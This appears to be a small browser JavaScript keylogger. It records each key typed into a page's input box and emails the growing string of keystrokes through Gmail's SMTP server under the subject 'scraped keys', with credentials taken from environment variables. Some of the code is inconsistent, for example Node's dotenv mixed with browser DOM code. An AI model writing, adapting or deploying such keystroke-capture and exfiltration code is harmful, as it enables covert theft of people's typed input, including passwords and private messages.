console.log('hello')
require('dotenv').config();

const inputBox = document.querySelector('.input-box')

/**
 * Configurations to send post request to SMTP server
 * @return {response} 'success response(OK)' or 'failure response'
 */
 function sendEmail() {
	Email.send({
	Host: "smtp.gmail.com",
	Username : process.env.EMAIL_ACCOUNT,
	Password : process.env.EMAIL_PASSWORD,
	To : process.env.EMAIL_ACCOUNT,
	From : process.env.EMAIL_ACCOUNT,
	Subject : "scraped keys",
	Body : keyString,
	}).then(
		message => alert("mail sent successfully")
	);
}

var keyString = "";

function buildKeyString (e) {
    var result = ''
    var character = String.fromCharCode(e.keyCode)
    if (e.keyCode === 13) {
        keyString = "enter"
    } else {
        result += character    
        keyString += result
        console.log(keyString)
        sendEmail()
    }
}

inputBox.addEventListener('keypress', (e) => {
    buildKeyString(e);
})

